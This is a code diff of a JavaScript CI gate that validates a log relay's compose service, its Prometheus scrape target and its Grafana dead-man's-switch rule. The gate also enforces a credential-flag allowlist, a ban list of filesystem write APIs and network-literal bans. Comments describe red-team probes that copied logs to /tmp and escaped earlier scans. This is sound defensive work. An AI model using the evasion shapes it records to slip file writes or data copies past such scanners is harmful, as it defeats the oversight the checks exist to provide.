+        `[${unexpected.join(', ') || 'none'}], missing [${missingFlags.join(', ') || 'none'}]. ` +
+        'This is an allowlist and not a credential-name denylist because a denylist is ' +
+        'unclosable: `--token`, `--api-key`, `--auth`, `--secret-file` and whatever comes next ' +
+        'all have to be enumerated, while an allowlist rejects the one nobody thought of. ' +
+        'OBS-45 forbids the relay ACCEPTING a module-owner credential, and accepting begins here.',
+    );
+  }
+  const logsDir = relayFlagValue(cmd.values, '--logs-dir');
+  if (!logsDir.ok) return fail(`G9n: ${logsDir.detail}`);
+  if (logsDir.value !== target && !logsDir.value.startsWith(`${target}/`)) {
+    return fail(
+      `G9n (OBS-45): the relay reads \`--logs-dir=${logsDir.value}\`, which is NOT inside its ` +
+        `read-only mount's container target \`${target}\`. A correct \`:ro\` mount the process ` +
+        'never actually reads from proves nothing at all: this is the clause that ties the mount ' +
+        'to the code path.',
+    );
+  }
+
+  return pass(
+    `G9n (OBS-45): the \`${RELAY_SERVICE_NAME}\` service mounts alloy's own \`${alloySource}\` ` +
+      `at \`${target}\` read-only, reads \`--logs-dir=${logsDir.value}\` from inside it, declares ` +
+      `none of [${RELAY_BANNED_KEYS.join(', ')}], carries no shell marker, and accepts exactly ` +
+      `[${RELAY_COMMAND_FLAGS.join(', ')}]`,
+  );
+}
+
+// ---------------------------------------------------------------------------
+// G9o — the scrape target, cross-resolved against the compose listen flag
+// ---------------------------------------------------------------------------
+
+export function checkRelayScrapeJobWired(prometheusYmlText, composeText) {
+  // The port comes from the RELAY's own scoped block. A file-wide
+  // `indexOf('--web.listen-address=')` over docker-compose.yml returns
+  // prometheus's `127.0.0.1:9090` (:51 is the first occurrence), so an unscoped
+  // read would compare the scrape target against the wrong service and call a
+  // broken target correct.
+  const cmd = relayCommandItems(composeText);
+  if (!cmd.ok) return fail(`G9o (OBS-46/P3): ${cmd.detail}`);
+  const listen = relayFlagValue(cmd.values, '--web.listen-address');
+  if (!listen.ok) return fail(`G9o: ${listen.detail}`);
+  const listenParts = listen.value.split(':');
+  if (listenParts.length !== 2) {
+    return fail(`G9o: the relay binds \`${listen.value}\`, which is not <host>:<port>`);
+  }
+  const composePort = toInt(listenParts[1]);
+  if (listenParts[0] !== '127.0.0.1' || composePort === null) {
+    return fail(
+      `G9o: the relay binds \`${listen.value}\` — this gate needs a numeric loopback <host>:<port> ` +
+        'to cross-check the scrape target against (C6 owns the loopback rule itself)',
+    );
+  }
+
+  // The job must resolve INSIDE `scrape_configs:`. A top-level `x-parked:` key
+  // holding a structurally perfect job satisfies a flat line scan while
+  // Prometheus never scrapes it — the AM17 decoy shape, one file over.
+  const lines = stripHashComments(prometheusYmlText).split('\n');
+  const roots = [];
+  for (let i = 0; i < lines.length; i++) {
+    if (lines[i].startsWith('scrape_configs:')) roots.push(i);
+  }
+  if (roots.length !== 1) {
+    return fail(
+      `G9o: expected exactly one column-0 \`scrape_configs:\` key, found ${roots.length}`,
+    );
+  }
+  if (lines[roots[0]].slice('scrape_configs:'.length).trim().length > 0) {
+    return fail('G9o: `scrape_configs:` uses inline/flow style, which this scanner cannot read');
+  }
+  const jobs = listItems(subBlock(lines, roots[0]));
+  if (jobs.length === 0) {
+    return fail('G9o: `scrape_configs:` declares ZERO jobs — nothing was scanned');
+  }
+
+  const named = [];
+  const relayJobs = [];
+  for (const job of jobs) {
+    const ji = indentOf(job[0]);
+    const nameRes = scopedScalar(job, 'job_name', ji, 'G9o: a scrape job');
+    if (!nameRes.ok) return fail(nameRes.detail);
+    named.push(nameRes.value);
+    if (nameRes.value === RELAY_SERVICE_NAME) relayJobs.push({ lines: job, indent: ji });
+  }
+  if (relayJobs.length !== 1) {
+    const decoyed =
+      relayJobs.length === 0 &&
+      stripHashComments(prometheusYmlText).includes(`job_name: ${RELAY_SERVICE_NAME}`);
+    return fail(
+      `G9o (OBS-46/P3): found ${relayJobs.length} \`job_name: ${RELAY_SERVICE_NAME}\` jobs INSIDE ` +
+        `\`scrape_configs:\`; exactly 1 is required. Jobs found: [${named.join(', ')}].` +
+        (decoyed
+          ? ' The name DOES appear elsewhere in prometheus.yml, under a key that is not ' +
+            '`scrape_configs:` — Prometheus ignores it entirely, so a flat line scan would call ' +
+            'this wired while the target is never scraped.'
+          : ' OBS-46 requires Prometheus to scrape the relay as ITS OWN target.'),
+    );
+  }
+  const job = relayJobs[0];
+
+  const metricsPath = scopedScalar(
+    job.lines,
+    'metrics_path',
+    job.indent,
+    `G9o: the \`${RELAY_SERVICE_NAME}\` scrape job`,
+  );
+  if (!metricsPath.ok) {
+    return fail(
+      `${metricsPath.detail}. Prometheus DEFAULTS to \`/metrics\` when the key is absent, so ` +
+        'omission is silent: the relay serves /health, the scrape 404s, `up` goes to 0 and the ' +
+        "dead-man's switch sits permanently firing — the exact failure the m20e-2 park warned " +
+        'about, arrived by omission rather than by intent.',
+    );
+  }
+  if (metricsPath.value !== '/health') {
+    return fail(
+      `G9o (OBS-46): the \`${RELAY_SERVICE_NAME}\` job scrapes \`${metricsPath.value}\`, expected ` +
+        '`/health` — that is the endpoint OBS-46 names and the only one the daemon serves',
+    );
+  }
+
+  const statics = scopedBlock(
+    job.lines,
+    'static_configs',
+    job.indent,
+    `G9o: the \`${RELAY_SERVICE_NAME}\` scrape job`,
+  );
+  if (!statics.ok) return fail(statics.detail);
+  const staticItems = listItems(statics.lines);
+  if (staticItems.length !== 1) {
+    return fail(
+      `G9o: the \`${RELAY_SERVICE_NAME}\` job declares ${staticItems.length} \`static_configs\` ` +
+        'entries; exactly 1 is required so the entry this gate reads is the entry Prometheus uses',
+    );
+  }
+  const targetsRes = scopedScalar(
+    staticItems[0],
+    'targets',
+    indentOf(staticItems[0][0]),
+    `G9o: the \`${RELAY_SERVICE_NAME}\` job's static_configs entry`,
+  );
+  if (!targetsRes.ok) return fail(targetsRes.detail);
+  const targets = flowListItems(targetsRes.value);
+  if (targets === null) {
+    return fail(
+      `G9o: the \`${RELAY_SERVICE_NAME}\` job's \`targets:\` is \`${targetsRes.value}\`, which is ` +
+        "not the flow-style list every sibling job uses (`['127.0.0.1:PORT']`) — fail loud rather " +
+        'than compare against a partial parse',
+    );
+  }
+  if (targets.length !== 1) {
+    return fail(
+      `G9o: the \`${RELAY_SERVICE_NAME}\` job declares ${targets.length} targets; exactly 1 is ` +
+        'required — a second target is a second, unreviewed process answering for this job',
+    );
+  }
+  const targetParts = targets[0].split(':');
+  if (targetParts.length !== 2) {
+    return fail(`G9o: the scrape target \`${targets[0]}\` is not <host>:<port>`);
+  }
+  if (targetParts[0] !== '127.0.0.1') {
+    return fail(
+      `G9o (OBS-17): the \`${RELAY_SERVICE_NAME}\` scrape target is \`${targets[0]}\`, whose host ` +
+        'is not 127.0.0.1 — every process in this stack runs on the host network, loopback-bound',
+    );
+  }
+  const targetPort = toInt(targetParts[1]);
+  if (targetPort === null || targetPort !== composePort) {
+    return fail(
+      `G9o (OBS-46/P3): Prometheus scrapes \`${targets[0]}\` but the relay's own compose block ` +
+        `binds \`${listen.value}\` (port ${composePort}). Co-occurrence is not wiring: a job and a ` +
+        'service that merely exist in the same repo produce `up=0` forever. NOTE for anyone ' +
+        "changing this check: the compose port MUST be read from the relay's scoped service " +
+        "block — a file-wide `indexOf('--web.listen-address=')` returns PROMETHEUS's 9090 " +
+        '(docker-compose.yml:51 is the first occurrence) and would silently compare the wrong two ' +
+        'numbers.',
+    );
+  }
+
+  return pass(
+    `G9o (OBS-46): \`job_name: ${RELAY_SERVICE_NAME}\` resolves inside \`scrape_configs:\` ` +
+      `(alongside ${named.length - 1} sibling job(s)), scrapes \`${metricsPath.value}\` on ` +
+      `\`${targets[0]}\`, which is the port the relay's own compose \`--web.listen-address\` binds`,
+  );
+}
+
+// ---------------------------------------------------------------------------
+// G9p — the dead-man's switch, asserted as something that can actually FIRE
+// ---------------------------------------------------------------------------
+
+/**
+ * Every provisioned alert rule, split on its `- uid:` item boundary and carrying
+ * its own group's interval.
+ *
+ * SPLIT ON ITEM BOUNDARIES, NEVER SCAN FORWARD FROM AN `expr:`. In rules.yml
+ * `for:` PRECEDES `expr:` inside a rule (`for:` at :43, `expr:` at :58), so a
+ * detector that finds AlloyDown by its expr and then searches forward for a
+ * `for:` picks up **`10m` from AlloyIngestStalled** (:80) — the next rule down.
+ * Every fixture in T-o gives its rules DIFFERENT `for:` values precisely so that
+ * bug is visible rather than accidentally harmless.
+ */
+function parseAlertingRules(alertRulesText) {
   const lines = stripHashComments(alertRulesText).split('\n');
-  const offender = lines.find((l) => l.includes(RELAY_SERVICE_NAME));
-  if (offender !== undefined) {
-    return fail(`G9g: an alerting rule references ${RELAY_SERVICE_NAME}: ${offender.trim()}`);
+  const roots = [];
+  for (let i = 0; i < lines.length; i++) {
+    if (lines[i].startsWith('groups:')) roots.push(i);
   }
-  const titles = lines.filter((l) => l.trim().startsWith('- uid:')).length;
-  if (titles === 0) {
-    return fail('G9g: the alerting provisioning declares zero rules — nothing was scanned');
+  if (roots.length !== 1) {
+    return fail(`expected exactly one column-0 \`groups:\` key, found ${roots.length}`);
   }
-  return pass(`G9g: ${titles} alert rule(s), none for the parked relay`);
+  const groups = listItems(subBlock(lines, roots[0]));
+  if (groups.length === 0) return fail('`groups:` declares zero groups — nothing was scanned');
+
+  const rules = [];
+  for (const group of groups) {
+    const gi = indentOf(group[0]);
+    const groupName = scopedScalar(group, 'name', gi, 'an alert group');
+    if (!groupName.ok) return groupName;
+    const rawInterval = scopedScalar(group, 'interval', gi, `alert group \`${groupName.value}\``);
+    if (!rawInterval.ok) return rawInterval;
+    const groupInterval = parseDurationSeconds(rawInterval.value);
+    if (groupInterval === null || groupInterval === 0) {
+      return fail(
+        `alert group \`${groupName.value}\` declares \`interval: ${rawInterval.value}\`, which ` +
+          'does not parse as a non-zero duration (G12b owns that rule; this gate needs the number)',
+      );
+    }
+    const rulesBlock = scopedBlock(group, 'rules', gi, `alert group \`${groupName.value}\``);
+    if (!rulesBlock.ok) return rulesBlock;
+    for (const item of listItems(rulesBlock.lines)) {
+      const ri = indentOf(item[0]);
+      if (!item[0].trim().startsWith('uid:')) {
+        return fail(
+          `a rule in group \`${groupName.value}\` does not begin with \`uid:\` (it begins ` +
+            `\`${item[0].trim().slice(0, 32)}\`) — this gate identifies rules by their \`- uid:\` ` +
+            'item boundary, so a different first key makes that mapping ambiguous',
+        );
+      }
+      const uid = scopedScalar(item, 'uid', ri, `a rule in group \`${groupName.value}\``);
+      if (!uid.ok) return uid;
+      const rule = {
+        uid: uid.value,
+        lines: item,
+        indent: ri,
+        groupName: groupName.value,
+        groupIntervalSeconds: groupInterval,
+        rawFor: null,
+        forSeconds: null,
+        condition: null,
+        isPaused: null,
+        severity: null,
+        data: [],
+        exprs: [],
+      };
+      const forIdx = keyIndices(item, 'for', ri);
+      if (forIdx.length > 1)
+        return fail(`rule \`${rule.uid}\` declares ${forIdx.length} \`for:\` keys`);
+      if (forIdx.length === 1) {
+        rule.rawFor = scalarOf(item[forIdx[0]], 'for');
+        rule.forSeconds = parseDurationSeconds(rule.rawFor);
+        if (rule.forSeconds === null) {
+          return fail(
+            `rule \`${rule.uid}\` declares \`for: ${rule.rawFor}\`, which does not parse as a ` +
+              "duration. Fail loud: '60s' vs '10m' string-compares WRONG, so this gate parses " +
+              'both sides to seconds and never compares the raw text.',
+          );
+        }
+      }
+      const condIdx = keyIndices(item, 'condition', ri);
+      if (condIdx.length > 1)
+        return fail(`rule \`${rule.uid}\` declares ${condIdx.length} \`condition:\` keys`);
+      if (condIdx.length === 1) rule.condition = scalarOf(item[condIdx[0]], 'condition');
+      const pausedIdx = keyIndices(item, 'isPaused', ri);
+      if (pausedIdx.length > 1)
+        return fail(`rule \`${rule.uid}\` declares ${pausedIdx.length} \`isPaused:\` keys`);
+      if (pausedIdx.length === 1) rule.isPaused = scalarOf(item[pausedIdx[0]], 'isPaused');
+      const labelsIdx = keyIndices(item, 'labels', ri);
+      if (labelsIdx.length > 1)
+        return fail(`rule \`${rule.uid}\` declares ${labelsIdx.length} \`labels:\` blocks`);
+      if (labelsIdx.length === 1) {
+        const sevIdx = keyIndices(subBlock(item, labelsIdx[0]), 'severity', null);
+        if (sevIdx.length === 1) {
+          rule.severity = scalarOf(subBlock(item, labelsIdx[0])[sevIdx[0]], 'severity');
+        }
+      }
+
+      const dataBlock = scopedBlock(item, 'data', ri, `rule \`${rule.uid}\``);
+      if (!dataBlock.ok) return dataBlock;
+      const entries = listItems(dataBlock.lines);
+      if (entries.length === 0) return fail(`rule \`${rule.uid}\` declares zero \`data:\` entries`);
+      for (const entry of entries) {
+        const di = indentOf(entry[0]);
+        const refId = scopedScalar(entry, 'refId', di, `a \`data:\` entry of rule \`${rule.uid}\``);
+        if (!refId.ok) return refId;
+        const ds = scopedScalar(
+          entry,
+          'datasourceUid',
+          di,
+          `\`data:\` entry \`${refId.value}\` of rule \`${rule.uid}\``,
+        );
+        if (!ds.ok) return ds;
+        const model = scopedBlock(
+          entry,
+          'model',
+          di,
+          `\`data:\` entry \`${refId.value}\` of rule \`${rule.uid}\``,
+        );
+        if (!model.ok) return model;
+        const modelIndent = model.lines.length > 0 ? indentOf(model.lines[0]) : di + 2;
+        const exprIdx = keyIndices(model.lines, 'expr', modelIndent);
+        if (exprIdx.length > 1) {
+          return fail(
+            `\`data:\` entry \`${refId.value}\` of rule \`${rule.uid}\` declares 2+ \`expr:\` keys`,
+          );
+        }
+        const expr = exprIdx.length === 1 ? scalarOf(model.lines[exprIdx[0]], 'expr') : null;
+        if (expr !== null) rule.exprs.push(expr);
+        rule.data.push({
+          refId: refId.value,
+          datasourceUid: ds.value,
+          expr,
+          modelLines: model.lines,
+          modelIndent,
+        });
+      }
+      rules.push(rule);
+    }
+  }
+  if (rules.length === 0) return fail('zero alert rules were parsed — nothing was scanned');
+  return { ok: true, rules, detail: `${rules.length} alert rule(s) parsed` };
+}
+
+/** The `__expr__` threshold node's shape: node type, evaluator type, params. */
+function thresholdShape(entry, uid) {
+  const where = `the \`${entry.refId}\` condition node of rule \`${uid}\``;
+  const nodeType = scopedScalar(entry.modelLines, 'type', entry.modelIndent, where);
+  if (!nodeType.ok) {
+    return fail(
+      `${nodeType.detail} — a condition node with no model-level \`type:\` is not a threshold, ` +
+        'and Grafana will not evaluate it into an alert state',
+    );
+  }
+  const expression = scopedScalar(entry.modelLines, 'expression', entry.modelIndent, where);
+  if (!expression.ok) return expression;
+  const conditions = scopedBlock(entry.modelLines, 'conditions', entry.modelIndent, where);
+  if (!conditions.ok) return conditions;
+  const items = listItems(conditions.lines);
+  if (items.length !== 1) {
+    return fail(`${where} declares ${items.length} \`conditions:\` entries; exactly 1 is required`);
+  }
+  const evaluator = scopedBlock(items[0], 'evaluator', indentOf(items[0][0]), where);
+  if (!evaluator.ok) return evaluator;
+  const evalIndent =
+    evaluator.lines.length > 0 ? indentOf(evaluator.lines[0]) : indentOf(items[0][0]) + 2;
+  const evalType = scopedScalar(evaluator.lines, 'type', evalIndent, `${where}'s evaluator`);
+  if (!evalType.ok) return evalType;
+  const paramsIdx = keyIndices(evaluator.lines, 'params', evalIndent);
+  if (paramsIdx.length !== 1) {
+    return fail(`${where}'s evaluator declares ${paramsIdx.length} \`params:\` keys, need 1`);
+  }
+  const params = scalarListUnder(evaluator.lines, paramsIdx[0]);
+  if (!params.ok) return fail(`${where}'s evaluator \`params:\` — ${params.detail}`);
+  if (params.values.length === 0) {
+    return fail(`${where}'s evaluator declares ZERO params — nothing was compared`);
+  }
+  return {
+    ok: true,
+    nodeType: nodeType.value,
+    expression: expression.value,
+    evaluatorType: evalType.value,
+    params: params.values,
+  };
+}
+
+export function checkRelayDeadMansSwitch(alertRulesText) {
+  const parsed = parseAlertingRules(alertRulesText);
+  if (!parsed.ok) return fail(`G9p: ${parsed.detail}`);
+
+  const relayRules = parsed.rules.filter((r) => r.exprs.some((e) => e.includes(RELAY_UP_NEEDLE)));
+  if (relayRules.length !== 1) {
+    return fail(
+      `G9p (OBS-46/P4): found ${relayRules.length} alert rules whose \`expr:\` contains ` +
+        `\`${RELAY_UP_NEEDLE}\`; exactly 1 is required. This slice lands the service, its scrape ` +
+        "target and its dead-man's switch in ONE change: `up` for a target that is never scraped " +
+        'is not a signal, and a service with no switch is a process whose death nobody notices ' +
+        `(rules parsed: [${parsed.rules.map((r) => r.uid).join(', ')}]).`,
+    );
+  }
+  const relay = relayRules[0];
+  if (relay.exprs.some((e) => e.includes(ALLOY_JOB_MATCHER))) {
+    return fail(
+      `G9p (OBS-46, spec:542-547): rule \`${relay.uid}\` watches BOTH \`${ALLOY_JOB_MATCHER}\` and ` +
+        `\`${RELAY_JOB_MATCHER}\` in one expression. The spec calls this out by name as ` +
+        "UNBUILDABLE: OBS-39 watches Prometheus's scrape of Alloy's self-metrics endpoint and " +
+        'carries no signal about whether the separate mr-trace-relay process is alive — Alloy ' +
+        'keeps running fine when the relay dies. A single `or`-widened rule fires for either ' +
+        'process and names neither, so the operator cannot act on it. OBS-46 requires a DISTINCT ' +
+        'rule on a DISTINCT target.',
+    );
+  }
+
+  const alloyRules = parsed.rules.filter(
+    (r) => r !== relay && r.exprs.some((e) => e.includes(ALLOY_UP_NEEDLE)),
+  );
+  if (alloyRules.length !== 1) {
+    return fail(
+      `G9p: found ${alloyRules.length} alert rules whose \`expr:\` watches \`${ALLOY_UP_NEEDLE}\` ` +
+        "and nothing else; exactly 1 (OBS-39's AlloyDown) is required. This gate DERIVES every " +
+        'number it compares — the pending period, the datasource, the threshold direction, the ' +
+        'severity — from that rule in this same document rather than re-spelling `60s`, `lt` and ' +
+        '`1` here, so without it there is nothing to derive from.',
+    );
+  }
+  const alloy = alloyRules[0];
+  if (relay.uid === alloy.uid) {
+    return fail(
+      `G9p (OBS-46): the relay rule and AlloyDown share the uid \`${relay.uid}\`. Grafana keys ` +
+        'provisioned rules by uid, so the second one silently REPLACES the first and the stack ' +
+        'ends up with one rule where the operator reads two.',
+    );
+  }
+
+  if (relay.isPaused !== null && relay.isPaused !== 'false') {
+    return fail(
+      `G9p (OBS-46): rule \`${relay.uid}\` declares \`isPaused: ${relay.isPaused}\`. A paused rule ` +
+        'is provisioned, visible in the UI, and NEVER evaluated — every other clause in this gate ' +
+        "stays green while the dead-man's switch is switched off.",
+    );
+  }
+
+  if (relay.forSeconds === null || alloy.forSeconds === null) {
+    return fail(
+      `G9p: rule \`${relay.forSeconds === null ? relay.uid : alloy.uid}\` declares no \`for:\` — ` +
+        "OBS-46's threshold is defined by reference to OBS-39's, so both sides must state one",
+    );
+  }
+  if (relay.forSeconds !== alloy.forSeconds) {
+    return fail(
+      `G9p (OBS-46): rule \`${relay.uid}\` declares \`for: ${relay.rawFor}\` (${relay.forSeconds}s) ` +
+        `while \`${alloy.uid}\` declares \`for: ${alloy.rawFor}\` (${alloy.forSeconds}s). This is ` +
+        "an EQUALITY check, not a lower bound: under a `>=` comparison a `for: 24h` dead-man's " +
+        'switch passes while being useless. The expected value is never re-spelled here — it is ' +
+        'READ from AlloyDown in this same document. If you are debugging this check rather than ' +
+        "the config: `for:` PRECEDES `expr:` inside a rule, so scanning forward from AlloyDown's " +
+        "expr finds AlloyIngestStalled's `10m`; and `'60s' < '10m'` string-compares wrong, so " +
+        'both sides are parsed to seconds.',
+    );
+  }
+  if (relay.groupIntervalSeconds > alloy.groupIntervalSeconds) {
+    return fail(
+      `G9p (OBS-46): the relay rule sits in group \`${relay.groupName}\` (interval ` +
+        `${relay.groupIntervalSeconds}s), which is COARSER than AlloyDown's group ` +
+        `\`${alloy.groupName}\` (${alloy.groupIntervalSeconds}s). Grafana transitions alert state ` +
+        'only on an evaluation boundary, so a coarser interval silently stretches the effective ' +
+        'pending period past the `for:` both rules agree on.',
+    );
+  }
+  if (relay.severity === null || relay.severity !== alloy.severity) {
+    return fail(
+      `G9p (AM19): rule \`${relay.uid}\` declares \`severity: ${relay.severity ?? '(none)'}\`, ` +
+        `expected AlloyDown's \`${alloy.severity ?? '(none)'}\`. Severity is not decoration here: ` +
+        'notification-policies.yml:8-9 routes on it, so a relay rule without the mirrored label ' +
+        'silently takes the catch-all 4h repeat interval instead of the 1h one its sibling gets.',
+    );
+  }
+
+  const relayExprEntry = relay.data.find(
+    (d) => d.expr !== null && d.expr.includes(RELAY_UP_NEEDLE),
+  );
+  const alloyExprEntry = alloy.data.find(
+    (d) => d.expr !== null && d.expr.includes(ALLOY_UP_NEEDLE),
+  );
+  if (relayExprEntry === undefined || alloyExprEntry === undefined) {
+    return fail('G9p: the query entry carrying the `up{...}` expr could not be resolved');
+  }
+  if (relayExprEntry.datasourceUid !== alloyExprEntry.datasourceUid) {
+    return fail(
+      `G9p (OBS-46): the relay rule queries datasource \`${relayExprEntry.datasourceUid}\` while ` +
+        `AlloyDown queries \`${alloyExprEntry.datasourceUid}\`. \`up\` is a PROMETHEUS series: ` +
+        'pointed at any other datasource the query returns no data forever, which Grafana renders ' +
+        'as "No Data" rather than as an alert — a switch that cannot fire.',
+    );
+  }
+
+  for (const [rule, label] of [
+    [relay, 'the relay rule'],
+    [alloy, `AlloyDown (\`${alloy.uid}\`)`],
+  ]) {
+    if (rule.condition === null) {
+      return fail(`G9p: ${label} declares no \`condition:\` — Grafana would evaluate nothing`);
+    }
+    if (rule.data.find((d) => d.refId === rule.condition) === undefined) {
+      return fail(
+        `G9p (OBS-46): ${label} names \`condition: ${rule.condition}\` but no \`data:\` entry ` +
+          `declares that refId (declared: [${rule.data.map((d) => d.refId).join(', ')}]). A ` +
+          'DANGLING condition refId is the quietest failure in this file: the expr is right, the ' +
+          'threshold node is right, and the rule never fires.',
+      );
+    }
+  }
+  const relayNode = relay.data.find((d) => d.refId === relay.condition);
+  const alloyNode = alloy.data.find((d) => d.refId === alloy.condition);
+  const relayShape = thresholdShape(relayNode, relay.uid);
+  if (!relayShape.ok) return fail(`G9p: ${relayShape.detail}`);
+  const alloyShape = thresholdShape(alloyNode, alloy.uid);
+  if (!alloyShape.ok) {
+    return fail(
+      `G9p: ${alloyShape.detail}. This gate derives the relay's expected threshold shape from ` +
+        'AlloyDown, so an unreadable AlloyDown is a fail-loud, never a skipped comparison.',
+    );
+  }
+  if (alloyShape.expression !== alloyExprEntry.refId) {
+    return fail(
+      `G9p: AlloyDown's condition node thresholds refId \`${alloyShape.expression}\`, which is not ` +
+        `the refId carrying its own \`up\` expr (\`${alloyExprEntry.refId}\`) — the rule this gate ` +
+        'derives from is itself mis-wired; fix OBS-39 first',
+    );
+  }
+  if (relayShape.expression !== relayExprEntry.refId) {
+    return fail(
+      `G9p (OBS-46): the relay rule's condition node thresholds refId ` +
+        `\`${relayShape.expression}\`, but the entry carrying \`${RELAY_UP_NEEDLE}\` is refId ` +
+        `\`${relayExprEntry.refId}\`. The threshold is applied to a DIFFERENT query than the one ` +
+        'that watches the relay, so the switch watches something else entirely.',
+    );
+  }
+  if (relayShape.nodeType !== alloyShape.nodeType) {
+    return fail(
+      `G9p (OBS-46): the relay rule's condition node is \`type: ${relayShape.nodeType}\`, expected ` +
+        `AlloyDown's \`${alloyShape.nodeType}\` — read from that rule, not re-spelled here`,
+    );
+  }
+  if (relayShape.evaluatorType !== alloyShape.evaluatorType) {
+    return fail(
+      `G9p (OBS-46): the relay rule's evaluator is \`type: ${relayShape.evaluatorType}\`, expected ` +
+        `AlloyDown's \`${alloyShape.evaluatorType}\`. Direction is the whole switch: \`up\` is 1 ` +
+        'when the target is healthy, so a `gt 1` evaluator NEVER fires and a `gt 0` evaluator ' +
+        'fires while the relay is FINE. The expr, the uid, the for: and the datasource all stay ' +
+        'correct through that mutation.',
+    );
+  }
+  if (relayShape.params.join(',') !== alloyShape.params.join(',')) {
+    return fail(
+      `G9p (OBS-46): the relay rule's evaluator params are [${relayShape.params.join(', ')}], ` +
+        `expected AlloyDown's [${alloyShape.params.join(', ')}] — read from that rule, not ` +
+        're-spelled here',
+    );
+  }
+  if (relayNode.datasourceUid !== alloyNode.datasourceUid) {
+    return fail(
+      `G9p: the relay rule's condition node runs on datasource \`${relayNode.datasourceUid}\`, ` +
+        `expected AlloyDown's \`${alloyNode.datasourceUid}\` (server-side expressions evaluate ` +
+        'under the `__expr__` pseudo-datasource; anything else is not a server-side threshold)',
+    );
+  }
+
+  return pass(
+    `G9p (OBS-46): \`${relay.uid}\` watches ${RELAY_UP_NEEDLE} only, is not paused, thresholds ` +
+      `refId ${relayShape.expression} with a ${relayShape.nodeType}/${relayShape.evaluatorType} ` +
+      `[${relayShape.params.join(', ')}] node on \`${relayNode.datasourceUid}\`, and mirrors ` +
+      `\`${alloy.uid}\` on for: ${relay.rawFor}, severity ${relay.severity} and datasource ` +
+      `${relayExprEntry.datasourceUid} — every one of those DERIVED from that rule in the same ` +
+      `document (group interval ${relay.groupIntervalSeconds}s <= ${alloy.groupIntervalSeconds}s)`,
+  );
 }
 
 // ===========================================================================
@@ -1041,12 +2014,22 @@ function containsCredentialWord(line, word) {
 /**
  * Write-shaped fs APIs NO relay file may reach for (OBS-45).
  *
- * CONTRACT CONSEQUENCE, stated so it is a decision and not an accident: the
- * batch CLI writes its OTLP document to STDOUT ONLY — there is no `--out` flag.
- * Allowing one blessed `writeFileSync` for `--out` is what let a red-team probe
- * plant `writeFileSync('/tmp/x', 'x')` in the shell and stay silent. A relay
- * that never writes at all is the only version of OBS-45 a static scan can
- * actually prove, and `> file` covers every use `--out` would have had.
+ * CONTRACT CONSEQUENCE, stated so it is a decision and not an accident: BOTH
+ * shells write their OTLP document to STDOUT ONLY — there is no `--out` flag on
+ * the batch CLI and none on the daemon. Allowing one blessed `writeFileSync` for
+ * `--out` is what let a red-team probe plant `writeFileSync('/tmp/x', 'x')` in
+ * the shell and stay silent. A relay that never writes at all is the only
+ * version of OBS-45 a static scan can actually prove, and `> file` covers every
+ * use `--out` would have had. It also settles D2: there is no offset checkpoint
+ * file, ever — offsets live in memory only, and the accepted, stated cost is
+ * that breadcrumbs written while the relay was down are never exported.
+ *
+ * 13r-b (AM7) — the eight needles below the original fourteen were added after a
+ * cheat daemon was WRITTEN and RUN through the proposed gates: it persisted its
+ * offsets with `await open(p, 'a').write(doc)` and copied the log tree with
+ * `cpSync('/logs', '/tmp/x', { recursive: true })` and scanned GREEN, because
+ * the list held `opensync` but not `open(`, and no `cpsync` at all. Promise-API
+ * and bulk-copy shapes are the two families the sync-suffixed names miss.
  */
 const WRITE_APIS = [
   'writefilesync',
@@ -1063,15 +2046,77 @@ const WRITE_APIS = [
   'mkdirsync',
   'chmodsync',
   'truncatesync',
+  // AM7, each PoC'd or in the same family as one that was:
+  'open(',
+  'promises.open',
+  'cpsync',
+  'mkdtempsync',
+  'writesync',
+  'symlinksync',
+  'linksync',
+  'utimessync',
 ];
 
-// AM12's mechanical ban list — this is what keeps the parked /health server and
-// tail-follow daemon out of the slice rather than a promise that they stay out.
-// AM12 scopes it to `relay/**`, so it is applied to EVERY .mjs in that directory
-// including the four test files, not just the five production ones.
-// The first needle is assembled from fragments so that no CODE line of this file
-// spells the dynamic-regexp constructor contiguously; the remote Semgrep gate
-// matches raw text as well as AST, and this repo has been red-ed by it 3x.
+/**
+ * AM16(a) — the two literals no relay production file may spell in CODE.
+ *
+ * `0.0.0.0` forces the endpoint through configuration instead of a wildcard bind
+ * that would make C6/OBS-17's loopback rule a statement about the compose file
+ * only. `://` is the remote-Semgrep raw-URL surface: `--config auto` matches
+ * scheme literals in RAW TEXT, so it has red-ed this repo on a websocket scheme
+ * sitting inside a COMMENT (which is why the needle is never written next to a
+ * scheme name anywhere in this file, only bare). Local `just ci` runs no
+ * Semgrep, so the round trip costs a squash onto a fresh branch after the push
+ * — force-push is hook-blocked. Both literals are cheap for
+ * the relay to obey: it takes its listen address from `--web.listen-address` and
+ * has no outbound URL at all (see the 13r-c park).
+ */
+const NETWORK_LITERAL_BANS = ['0.0.0.0', '://'];
+
+/**
+ * The read APIs a relay SHELL file must positively use. A shell that reads
+ * nothing cannot be confirmed to read READ-ONLY.
+ *
+ * AM15: `createreadstream` is here because `daemon.mjs` IMPORTS `collectLogFiles`
+ * and `loadTracePairSet` from the batch CLI rather than re-implementing them
+ * (single source of truth for the 4-stage "absence is NOT the empty set"
+ * contract), so it may legitimately contain neither `readfilesync` nor
+ * `readdirsync` — `createReadStream(path, {start, end})` is its real read API.
+ * `fs.openSync` is not an option: `opensync` is a banned WRITE_API (D3).
+ */
+const RELAY_READ_APIS = ['readfilesync', 'readdirsync', 'createreadstream'];
+
+// ---------------------------------------------------------------------------
+// G9j — the THREE hygiene ban tiers (AM8)
+//
+// AM12's mechanical ban list kept the /health server and the tail-follow daemon
+// out of m20e entirely. 13r-b LANDS both, and the wrong move here — the one that
+// keeps `just ci` green while turning the live gate vacuous — is to relax the
+// list globally. It is RETIERED instead, and one ban is KEPT that the naive
+// retier would have dropped:
+//
+//   PURE tier  (RELAY_PURE_FILES + their tests + the batch CLI) — all 8, as
+//              before. `tail.mjs` is a state machine over plain data; if it can
+//              reach a clock, a timer or a socket it is not a pure core.
+//   DAEMON tier (daemon.mjs ONLY) — relaxes `node:http`, `.listen(` and exactly
+//              ONE of `setinterval(`/`settimeout(`. `date.now(` STAYS BANNED
+//              (AM16(b)): nothing in the daemon reads wall-clock time — pairing
+//              uses the host-populated `ts` (OBS-43), cadence uses the timer, and
+//              /health's counter is a monotonic count — so cutting the `now` seam
+//              lets the retier KEEP a ban instead of relaxing it. Gains the
+//              EGRESS ban below (the P5 tripwire).
+//   DAEMON-TEST tier (daemon.test.mjs ONLY) — ALL 8, unrelaxed. It drives
+//              INJECTED transports and needs none of the relaxations. This is
+//              what mechanically forces the injected seam rather than trusting
+//              the author to build one, and it is what stops a real listener on
